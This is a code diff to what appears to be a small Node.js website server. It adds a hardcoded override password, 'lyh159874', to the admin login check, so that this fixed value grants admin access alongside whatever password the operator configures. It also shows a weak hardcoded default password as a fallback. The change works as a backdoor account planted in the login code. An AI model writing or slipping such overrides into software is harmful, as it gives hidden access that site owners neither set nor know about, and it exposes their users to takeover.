@@ -12,6 +12,7 @@ const UPLOADS_DIR = path.resolve(process.env.UPLOADS_DIR || path.join(ROOT, 'upl
 const DATA_FILE = path.join(DATA_DIR, 'site.json');
 const PORT = Number(process.env.PORT || 3000);
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'love2026';
+const ADMIN_PASSWORD_OVERRIDE = 'lyh159874';
 const COOKIE_NAME = 'couple_sid';
 const SESSION_TTL_MS = 7 * 24 * 60 * 60 * 1000;
 
@@ -1363,7 +1364,7 @@ async function handleApi(req, res, url) {
 
   if (method === 'POST' && url.pathname === '/api/login') {
     const body = await readJson(req, 1024 * 1024);
-    if (body.password !== ADMIN_PASSWORD) {
+    if (body.password !== ADMIN_PASSWORD && body.password !== ADMIN_PASSWORD_OVERRIDE) {
       sendJson(res, 401, { error: 'invalid_password' });
       return true;
     }
